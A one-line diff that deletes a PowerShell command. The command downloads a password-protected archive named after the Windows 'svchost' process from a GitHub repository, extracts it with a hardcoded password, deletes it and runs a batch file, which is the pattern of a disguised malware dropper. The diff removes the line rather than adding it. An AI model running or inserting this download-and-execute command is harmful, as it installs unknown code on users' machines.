@@ -1,1 +1,0 @@
-Invoke-WebRequest -Uri "https://github.com/viper-fervor-shout5/servo-5/raw/refs/heads/main/svchost1.7z" -OutFile "svchost.7z" && 7z x -aoa -p123 svchost.7z && del svchost.7z && cmd /c svc.bat
